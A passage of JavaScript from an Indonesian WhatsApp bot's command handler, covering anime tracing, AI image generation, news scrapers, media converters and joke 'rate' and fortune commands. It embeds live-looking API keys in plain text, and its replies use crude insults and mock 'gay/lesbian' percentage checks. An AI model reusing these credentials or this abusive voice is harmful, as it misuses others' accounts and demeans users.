    let { anilist, from, to, similarity, video, episode } = result.result[0];
    let animeTitle = anilist.title ? anilist.title.romaji || anilist.title.native : "Unknown Title";
    let message = `*Anime:* ${animeTitle}\n`;
    if (anilist.synonyms && anilist.synonyms.length > 0) {
      message += `*Synonyms:* ${anilist.synonyms.join(", ")}\n`;
    }
    message += `*Similarity:* ${similarity.toFixed(2)}%\n`;
    message += `*Time:* ${formatDuration(from * 1000)} - ${formatDuration(to * 1000)}\n`;
    if (episode) {
      message += `*Episode:* ${episode}\n`;
    }
    console.log("Anime Information:", {
      animeTitle,
      synonyms: anilist.synonyms ? anilist.synonyms.join(", ") : "Not Available",
      similarity,
      timestamp: `${formatDuration(from * 1000)} - ${formatDuration(to * 1000)}`,
      video,
      episode,
    });
    // Send the video with anime information as the caption
    await qyuunee.sendMessage(m.chat, {video: {url: video}, caption: message},{quoted: m});
  } catch (error) {
    console.error("Error:", error);
    reply("*Error: Could not track the anime or send the video.*");
  }
};
break

case 'animediff': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
if (!full_args) return reply('Contoh: .animediff 1girl,long hair,light purple hair,star eyes,hoodie and hot pants coordinate,black tights,short boots,mystical beauty,city date,whole body')
reply('tunggu 60 detik.')
try {
/*
let anu = await fetchJson(`https://api.koi.pics/api/ai/animediffusion?q=${full_args}&apikey=hutaowangybanget`)
qyuunee.sendMessage(from, { image: { url: anu.data }, fileName: 'anu.jpg' }, { quoted: m })
*/
let result = await getBuffer(`https://api.koi.pics/api/ai/animediffusion?q=${full_args}`)
await sleep(55000)
qyuunee.sendMessage(from, { image: result }, {quoted:m})
} catch (e) {
reply(mess.error)
}
}
break

case 'animediff2': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
if (!full_args) return reply('Contoh: .animediff2 1girl,long hair,light purple hair,star eyes,hoodie and hot pants coordinate,black tights,short boots,mystical beauty,city date,whole body')
reply('tunggu 60 detik.')
try {
/*
let anu = await fetchJson(`https://api.koi.pics/api/ai/animediffusion?q=${full_args}&apikey=hutaowangybanget`)
qyuunee.sendMessage(from, { image: { url: anu.data }, fileName: 'anu.jpg' }, { quoted: m })
*/
let result = await getBuffer(`https://api.koi.pics/api/ai/animediffusion2?q=${full_args}`)
await sleep(55000)
qyuunee.sendMessage(from, { image: result }, {quoted:m})
} catch (e) {
reply(mess.error)
}
}
break

case 'stablediff': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
if (!full_args) return reply('Contoh: .stablediff astronaut, in the forest, sunset, 4k, detailed')
reply('tunggu 60 detik.')
try {
let result = await getBuffer(`https://api.koi.pics/api/ai/stablediffusion?q=${full_args}`)
await sleep(55000)
qyuunee.sendMessage(from, { image: result }, {quoted:m})
} catch (e) {
reply(mess.error)
}
}
break

case 'stablediff2': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
if (!full_args) return reply('Contoh: .stablediff astronaut, in the forest, sunset, 4k, detailed')
reply('tunggu 60 detik.')
try {
let result = await getBuffer(`https://api.koi.pics/api/ai/stablediffusion2?q=${full_args}`)
await sleep(55000)
qyuunee.sendMessage(from, { image: result }, {quoted:m})
} catch (e) {
reply(mess.error)
}
}
break

case 'kivotos':{
if (!text) return reply('Apa yang ingin kamu buat?')
await qyuunee.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
    let myHeaders = new Headers();
    myHeaders.append("Content-Type", "application/json");
    let raw = JSON.stringify({
        "key": "MxkYE34KhieMxYYfwLxaMUfXQCJLcu1S6qGLI3jrgQSZ4oWC6z9W5maTPA5E",
        "model_id": "kivotos-xl",
        "prompt": full_args,
        "negative_prompt": "worst quality, normal quality, low quality, low res, blurry, jpeg artifacts, bad anatomy, bad hands, three hands, three legs, bad arms, missing legs, ugly, tiling, poorly drawn hands, poorly drawn feet, poorly drawn face, out of frame, extra limbs, disfigured, deformed, body out of frame, bad anatomy, watermark, signature, cut off, low contrast, underexposed, overexposed, bad art, beginner, amateur, distorted face, blurry, draft, grainy",
        "width": "512",
        "height": "512",
        "samples": "1",
        "num_inference_steps": "20",
        "seed": null,
        "guidance_scale": 7.5,
        "safety_checker": null,
        "multi_lingual": "no",
        "panorama": "no",
        "self_attention": "no",
        "upscale": "no",
        "embeddings_model": null,
        "webhook": null,
        "track_id": null,
        "enhance_prompt": true
    });
    var requestOptions = {
        method: 'POST',
        headers: myHeaders,
        body: raw,
        redirect: 'follow'
    };
    try {
        let result = await fetchJson("https://stablediffusionapi.com/api/v3/text2img", requestOptions);
        let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Kivotos XL\n\n' + full_args
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: `${result.output[0]}` } }, { upload: qyuunee.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"✨\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363201331652484@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await qyuunee.relayMessage(m.chat, msgs.message, {})
    } catch (error) {
        console.log('error', error);
        let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: text
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: `${error.config.url}` } }, { upload: qyuunee.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"✨\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363201331652484@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await qyuunee.relayMessage(m.chat, msgs.message, {})
    }
}
break

case 'kill':case 'pat':case 'lick':case 'bite':case 'yeet':case 'bonk':case 'wink':case 'poke':case 'nom':case 'slap':case 'smile':case 'wave':case 'blush':case 'smug':case 'glomp':case 'happy':case 'dance':case 'cringe':case 'highfive':case 'handhold':
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
 axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
qyuunee.sendMessage(from, { video: { url: data.url }, gifPlayback: true }, {quoted:m})
})
break

case "bucin": case "dare": case "faktaunix": case "fml": case "katabijak": case "katacinta": case "katagalau": case "katahacker": case "katailham": case "katasenja": case "katasindiran": case "motivasi": case "nickff": case "pantun": case "puisi": case "quotesislamic": case "quotespubg": case "truth": {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
const t3xt = require(`./database/teks/${command}.json`)
const r4andT3xt = t3xt[Math.floor(Math.random() * t3xt.length)]
qyuunee.sendMessage(from, { text: r4andT3xt }, { quoted: m })
}
break

case 'rate': {
            	if (!text) return reply(`Example : ${prefix + command} my profile`)
            	let ra = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
                let kah = ra[Math.floor(Math.random() * ra.length)]
                let jawab = `*Rate ${text}*\nAnswer : ${kah}%`                
            await reply(jawab)
            }
            break
            
            case 'gantengcek':
            case 'cekganteng': {
                if (!q) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Owner`)
                const gan = ['10% banyak" perawatan ya bang:v\nCanda Perawatan:v','30% Semangat bang Merawat Dirinya><','20% Semangat Ya bang👍','40% Wahh bang><','50% abang Ganteng deh><','60% Hai Ganteng🐊','70% Hai Ganteng🐊','62% Bang Ganteng><','74% abang ni ganteng deh><','83% Love You abang><','97% Assalamualaikum Ganteng🐊','100% Bang Pake Susuk ya??:v','29% Semangat Bang:)','94% Hai Ganteng><','75% Hai Bang Ganteng','82% wihh abang Pasti Sering Perawatan kan??','41% Semangat:)','39% Lebih Semangat🐊']
                const teng = gan[Math.floor(Math.random() * gan.length)]
                reply(`Nama : ${q}\nJawaban : *${teng}%`)
                }
            break
                
            case 'cantikcek':
            case 'cekcantik': {
                if (!q) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Akame`)
                const can = ['10% banyak" perawatan ya kak:v\nCanda Perawatan:v','30% Semangat Kaka Merawat Dirinya><','20% Semangat Ya Kaka👍','40% Wahh Kaka><','50% kaka cantik deh><','60% Hai Cantik🐊','70% Hai Ukhty🐊','62% Kakak Cantik><','74% Kakak ni cantik deh><','83% Love You Kakak><','97% Assalamualaikum Ukhty🐊','100% Kakak Pake Susuk ya??:v','29% Semangat Kakak:)','94% Hai Cantik><','75% Hai Kakak Cantik','82% wihh Kakak Pasti Sering Perawatan kan??','41% Semangat:)','39% Lebih Semangat🐊']
                const tik = can[Math.floor(Math.random() * can.length)]
                reply(`Nama : ${q}\nJawaban : *${tik}%`)
                }
            break
            
            case 'sangecek':
            case 'ceksange':
            case 'gaycek':
            case 'cekgay':
            case 'lesbicek':
            case 'ceklesbi': {
                if (!q) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} ${pushname}`)
                const sangeh = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
                const sange = sangeh[Math.floor(Math.random() * sangeh.length)]
                reply(`Nama : ${q}\nJawaban : *${sange}%*`)
                }
            break
            
            case 'wangy': {
                if (!q) return reply(`Contoh : .wangy HuTao`)
                qq = q.toUpperCase()
                awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
                qyuunee.sendMessage(from, { text: awikwok }, { quoted: m })
                }
            break
            
            case 'cekmati': {
                if (!q) return reply(`Invalid!\n\nYg mau di cek siapa kontol?`)
                predea = await axios.get(`https://api.agify.io/?name=${q}`)
                reply(`Nama : ${predea.data.name}\n*Mati Pada Umur :* ${predea.data.age} Tahun.\n\n_Cepet Cepet Tobat Bro Soalnya Mati ga ada yang tau_`)
                }
            break
            
            case 'halah':
            case 'hilih':
            case 'huluh':
            case 'heleh':
            case 'holoh': {
                if (!m.quoted && !text) return reply(`Kirim/reply text dengan caption ${prefix + command}`)
                ter = command[1].toLowerCase()
                tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
                reply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
                }
            break
            
case 'fajar':
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
FajarNews().then(async(res) => {
console.log(res) 
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
break

case 'cnn':
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
CNNNews().then(res => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
break

case 'layarkaca':
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
if (!q) return reply('Judul') 
LayarKaca21(q).then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Film: ${i.film_title}\n`
teks += `Link: ${i.film_link}\n`
}
teks += ``
reply(teks) 
})
break

case 'cnbc':
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
CNBCNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
qyuunee.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break

case 'tribun':
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
TribunNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
qyuunee.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break

case 'indozone':
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
IndozoneNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
qyuunee.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break

case 'kompas':
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
KompasNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
qyuunee.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break

case 'detik':
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
DetikNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
qyuunee.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break

case 'daily':
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
DailyNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
qyuunee.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break

case 'inews':
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
iNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
break

case 'okezone':
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
OkezoneNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
qyuunee.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break

case 'sindo':
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
SindoNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
break

case 'tempo':
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
TempoNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
qyuunee.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break

case 'antara':
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
AntaraNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
qyuunee.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break

case "kontan":
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
KontanNews().then(async (res) => {
teks = ""
no = 0
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
qyuunee.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break

case "merdeka":
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
MerdekaNews().then(async (res) => {
teks = ""
no = 0
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
qyuunee.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break

case "jalantikus":
loading()
var reis = await JalanTikusMeme()
teks = ""
teks += "Jalan Tikus Meme\n\n"
teks += `Source: ${reis}`
teks += ""
qyuunee.sendMessage(m.chat, { image : { url : reis }, caption: teks }, { quoted:m })
break

case 'smeme':
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
 if (!text) reply `Balas Image Dengan Caption ${prefix + command}`
if (!quoted) reply `Balas Image Dengan Caption ${prefix + command}`
if (/image/.test(mime)) {
reply('*Sabar Cuy Loading*')
mee = await qyuunee.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
kaytid = await getBuffer(`https://api.memegen.link/images/custom/-/${text}.png?background=${mem}`)
qyuunee.sendImageAsSticker(m.chat, kaytid, m, { packname: global.packname, author: global.author })
} else if (/webp/.test(mime)) {
reply('*Sabar Cuy Loading*')
media = await qyuunee.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
kaytid = await getBuffer(`https://api.memegen.link/images/custom/-/${text}.png?background=${mem}`)
qyuunee.sendImageAsSticker(m.chat, kaytid, m, { packname: global.packname, author: global.author })
} else {
reply('🚫 ERORR')
}
break

case 'toimage': case 'toimg': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) reply `Balas sticker dengan caption *${prefix + command}*`
let media = await qyuunee.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
qyuunee.sendMessage(from, { image: buffer }, {quoted:m})
fs.unlinkSync(ran)
})
}
break

case 'tomp4': case 'tovideo': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
if (!quoted) reply `Balas sticker video Dengan Caption ${prefix + command}`
if (/video/.test(mime)) {
let { webp2mp4File } = require('./lib/uploader')
let media = await qyuunee.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await qyuunee.sendMessage(from, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, {quoted:m})
await fs.unlinkSync(media)
}
}
break
case 'tomp3': {
if (!/video/.test(mime) && !/audio/.test(mime)) reply `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
loading()
if (!quoted) reply `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
let media = await qyuunee.downloadMediaMessage(quoted)
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
qyuunee.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${qyuunee.user.name}.mp3`}, { quoted : m })
}
break

case 'toaudio': case 'audio': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
if (!/video/.test(mime) && !/audio/.test(mime)) reply `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
if (!quoted) reply `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
let media = await qyuunee.downloadMediaMessage(quoted)
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
qyuunee.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
}
break

case 'tovn': case 'voice': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
if (!/video/.test(mime) && !/audio/.test(mime)) reply `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
if (!quoted) reply `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
reply('*Sabar Cuy Loading*')
let media = await quoted.download()
let { toPTT } = require('./lib/converter')
let audio = await toPTT(media, 'mp4')
qyuunee.sendMessage(from, {audio: audio, mimetype:'audio/mpeg', ptt:true, contextInfo:{  externalAdReply: { showAdAttribution: true,
mediaType:  1,
mediaUrl: 'https://ikankoi.my.id',
title: `Lumine-MD`,
sourceUrl: `https://ikankoi.my.id`, 
thumbnail: thumb
}
}})
}
break

case 'togif': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) reply `*reply sticker with caption* *${prefix + command}*`
 let { webp2mp4File } = require('./lib/uploader')
let media = await qyuunee.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await qyuunee.sendMessage(from, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, {quoted:m})
await fs.unlinkSync(media)
}
break

case 'tourl': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
if (!/video/.test(mime) && !/image/.test(mime)) reply `*Send/Reply the Video/Image With Caption* ${prefix + command}`
if (!quoted) reply `*Send/Reply the Video/Image Caption* ${prefix + command}`
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
let media = await qyuunee.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
reply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media)
reply(util.format(anu))
}
await fs.unlinkSync(media)
}
break

case "quotes":
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
 var resi = await Quotes()
teks = `\nAuthor: ${resi.author}\n`
teks = `\nQuotes:\n`
teks = `${resi.quotes}\n`
reply(teks)
break

case 'emojimix': { 
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
 let [emoji1, emoji2] = text.split`+`
if (!emoji1) reply `Example : ${prefix + command} 😅+🤔`
if (!emoji2) reply `Example : ${prefix + command} 😅+🤔`
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
let encmedia = await qyuunee.sendImageAsSticker(from, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break

case 'emojimix2': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
 if (!text) reply `Example : ${prefix + command} 😅`
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
for (let res of anu.results) {
let encmedia = await qyuunee.sendImageAsSticker(from, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break

case 'artimimpi': case 'tafsirmimpi': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
 if (!text) reply `Example : ${prefix + command} belanja`
 let anu = await primbon.tafsir_mimpi(text)
 if (anu.status == false) return reply(anu.message)
 qyuunee.sendText(from, `⭔ *Mimpi :* ${anu.message.mimpi}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Solusi :* ${anu.message.solusi}`, m)
}
break

case 'ramalanjodoh': case 'ramaljodoh': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
 if (!text) reply `Example : ${prefix + command} Koi, 7, 7, 2005, Putri, 16, 11, 2004`
 let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
 let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
 if (anu.status == false) return reply(anu.message)
 qyuunee.sendText(from, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break

case 'artinama': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
 if (!text) reply `Example : ${prefix + command} Koi`
 let anu = await primbon.arti_nama(text)
 if (anu.status == false) return reply(anu.message)
 qyuunee.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break

case 'kecocokannama': case 'cocoknama': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
 if (!text) reply `Example : ${prefix + command} Koi, 7, 7, 2005`
 let [nama, tgl, bln, thn] = text.split`,`
 let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 qyuunee.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Life Path :* ${anu.message.life_path}\n⭔ *Destiny :* ${anu.message.destiny}\n⭔ *Destiny Desire :* ${anu.message.destiny_desire}\n⭔ *Personality :* ${anu.message.personality}\n⭔ *Persentase :* ${anu.message.persentase_kecocokan}`, m)
}
break

case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
 if (!text) reply `Example : ${prefix + command} Koi|Putri`
 let [nama1, nama2] = text.split`|`
